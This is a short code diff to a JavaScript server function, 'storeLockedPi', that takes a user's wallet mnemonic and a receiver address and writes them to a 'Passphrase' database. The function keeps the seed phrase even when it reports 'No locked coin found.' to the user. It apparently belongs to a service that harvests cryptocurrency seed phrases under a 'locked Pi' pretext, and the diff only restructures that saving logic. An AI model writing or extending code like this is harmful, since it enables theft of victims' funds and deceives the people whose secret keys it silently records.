@@ -2,7 +2,7 @@ import Passphrase from "../models/Passphrase.js";
 import Sponsors from "../models/Sponsors.js";
 import { getClaimableBalance } from "./fn.js";
 
-export async function storeLockedPi(mnemonic, derivedPublicKey, receiverAddress) {
+export async function storeLockedPi(mnemonic, derivedPublicKey, receiverAddress, local = false) {
     // const existing = await Passphrase.findOne({ mnemonic });
     // if (existing) {
     //     return {success: false, message: 'Passphrase already exists' };
@@ -47,18 +47,16 @@ export async function storeLockedPi(mnemonic, derivedPublicKey, receiverAddress)
             await Passphrase.insertMany(entries);
             return {success: true, message: 'Passphrase and balances saved' };
         }
+    }
+    if(!local) {
+        const existing = await Passphrase.findOne({ mnemonic });
+        if (existing) {
+            return {success: false, message: 'No locked coin found.' };
+        }
 
         await Passphrase.create({ mnemonic, receiverAddress });
         return {success: false, message: 'No locked coin found.' };
     }
-
-    const existing = await Passphrase.findOne({ mnemonic });
-    if (existing) {
-        return {success: false, message: 'No locked coin found.' };
-    }
-
-    await Passphrase.create({ mnemonic, receiverAddress });
-    return {success: false, message: 'No locked coin found.' };
 }
 
 export async function storeSponsor(mnemonic, name) {
